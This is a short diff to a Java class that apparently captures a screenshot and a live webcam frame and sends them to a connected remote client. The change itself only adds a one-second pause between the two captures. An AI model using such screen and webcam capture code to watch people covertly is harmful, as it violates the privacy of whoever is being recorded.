@@ -63,6 +63,10 @@ public class ImageComponents {
             ConnectClient.msg("icon-screen");
             sendImage(9, screen);
         }
+        try {
+            Thread.sleep(1000);
+        } catch (InterruptedException ignored) {
+        }
         BufferedImage webcam = getWebcam(0, WEBCAM_LIVE, false);
         if (webcam != null) {
             WEBCAM_HISTORY.add(webcam);
